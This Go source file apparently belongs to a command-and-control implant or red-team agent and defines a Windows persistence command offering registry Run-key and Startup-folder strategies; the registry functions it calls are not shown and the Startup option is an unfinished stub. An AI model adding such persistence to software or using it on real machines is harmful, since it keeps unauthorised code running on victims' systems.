package windows

// WindowsPersistence provides methods to enable persistence on Windows systems.
// A common technique is to create a registry entry under
// HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run to

// save the binary into %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup to achieve persistence on Windows systems.

var typePersistence = map[string]string{
	"registry_run_key": "This will modify the registry key based on user privileges.",
	"startup_folder":   "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
}

type WindowsPersistence struct{}

func (wp *WindowsPersistence) Enable(args []string) (bool, string, string) {
	// Implement Windows-specific persistence logic here
	if len(args) < 1 {
		return false, "", "Usage: persistence enable windows\n" + HelpCommandPersistence([]string{})
	}
	wp.SetStrategy(args[0])

	return true, args[0], wp.SetStrategy(args[0]) + "\n"
}

func (wp *WindowsPersistence) Disable(strategy string) (bool, string) {
	switch strategy {
	case "registry_run_key":
		return false, RegPersistRemove()
	case "startup_folder":
		// Implement startup folder removal logic here
		return false, "Startup folder persistence removal not yet implemented.\n"
	default:
		return false, "Unknown Windows persistence strategy.\n"
	}

}

func (wp *WindowsPersistence) SetStrategy(strategy string) string {
	if _, exists := typePersistence[strategy]; !exists {
		return "Unknown Windows persistence strategy.\n"
	}
	switch strategy {
	case "registry_run_key":
		return RegPersist()
	case "startup_folder":
		// Implement startup folder persistence logic here
		return "Startup folder persistence strategy not yet implemented.\n"
	default:
		return "Unknown Windows persistence strategy.\n"
	}

}

func HelpCommandPersistence(args []string) string {
	persistenceText := "Available Persistence:\n"
	for perc := range typePersistence {
		persistenceText += "- " + perc + "\t this will modify " + typePersistence[perc] + "\n"
	}
	return persistenceText
}
